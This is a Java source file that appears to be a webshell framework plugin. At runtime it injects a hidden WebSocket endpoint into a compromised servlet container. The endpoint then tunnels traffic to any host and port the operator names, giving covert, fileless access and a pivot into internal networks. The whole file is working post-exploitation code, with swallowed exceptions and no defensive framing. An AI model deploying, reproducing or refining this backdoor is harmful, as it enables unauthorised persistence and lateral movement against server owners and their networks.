import java.io.ByteArrayOutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.HashMap;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import javax.servlet.*;
import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;

public final class WebSocket_Proxy extends Endpoint implements MessageHandler.Whole<ByteBuffer>,CompletionHandler<Integer, Session> {

    private Session session;
    private String Pwd;
    private String path;
    private String secretKey;
    private HashMap parameterMap;
    private ServletConfig servletConfig;
    private ServletContext servletContext;
    final ByteBuffer buffer = ByteBuffer.allocate(102400);
    private AsynchronousSocketChannel client = null;
    long i = 0;
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    HashMap<String,AsynchronousSocketChannel> map = new HashMap<String,AsynchronousSocketChannel>();

    public WebSocket_Proxy() {}


    public boolean equals(Object obj) {
        try {
            this.parameterMap = (HashMap)obj;
            this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
            this.Pwd = get("pwd");
            this.path = get("path");
            this.secretKey = get("secretKey");
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public String toString() {
        this.parameterMap.put("result", addWs().getBytes());
        this.parameterMap = null;
        return "";
    }

    public String addWs() {
        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(this.getClass(), this.path).build();
        ServletContext x = (ServletContext) this.servletContext;
        ServerContainer container = (ServerContainer) x.getAttribute(ServerContainer.class.getName());
        try {
            if (x.getAttribute(this.path) == null){
                container.addEndpoint(configEndpoint);
                x.setAttribute(this.path,this.path);
                return "success";
            } else {
                return "path err";
            }
        } catch (Exception ignored) {
        }
        return "fail";
    }

    @Override
    public void onMessage(ByteBuffer message) {
        try {
            message.clear();
            i++;
            process(message,session);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void completed(Integer result, final Session channel) {
        buffer.clear();
        try {
            if(buffer.hasRemaining() && result>=0)
            {
                byte[] arr = new byte[result];
                ByteBuffer b = buffer.get(arr,0,result);
                baos.write(arr,0,result);
                ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                if (channel.isOpen()) {
                    channel.getBasicRemote().sendBinary(q);
                }
                baos = new ByteArrayOutputStream();
                readFromServer(channel,client);
            }else{
                if(result > 0)
                {
                    byte[] arr = new byte[result];
                    ByteBuffer b = buffer.get(arr,0,result);
                    baos.write(arr,0,result);
                    readFromServer(channel,client);
                }
            }
        } catch (Exception ignored) {
        }
    }
    @Override
    public void failed(Throwable t, Session channel) {t.printStackTrace();}

    void readFromServer(Session channel,final AsynchronousSocketChannel client){
        this.client = client;
        buffer.clear();
        client.read(buffer, channel, this);
    }


    void process(ByteBuffer z,Session channel)
    {
        try{
            if(i>1)
            {
                AsynchronousSocketChannel client = map.get(channel.getId());
                client.write(z).get();
                readFromServer(channel,client);
            }
            else if(i==1)
            {
                String values = new String(z.array());
                String[] array = values.split(" ");
                String[] addrarray = array[1].split(":");
                AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
                int po = Integer.parseInt(addrarray[1]);
                InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
                Future<Void> future = client.connect(hostAddress);
                try {
                    future.get(10, TimeUnit.SECONDS);
                } catch(Exception ignored){
                    channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                    return;
                }
                map.put(channel.getId(), client);
                readFromServer(channel,client);
                channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
            }
        }catch(Exception ignored){
        }
    }
    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.i = 0;
        this.session = session;
        session.setMaxBinaryMessageBufferSize(1024*1024*1024);
        session.setMaxTextMessageBufferSize(1024*1024*1024);
        session.addMessageHandler(this);
    }

    public void init(ServletConfig paramServletConfig) throws ServletException {
        this.servletConfig = paramServletConfig;
    }

    public ServletConfig getServletConfig() {
        return this.servletConfig;
    }

    public String getServletInfo() {
        return "";
    }

    public void destroy() {}

    public String get(String key) {
        try {
            return new String((byte[])this.parameterMap.get(key));
        } catch (Exception e) {
            return null;
        }
    }
}
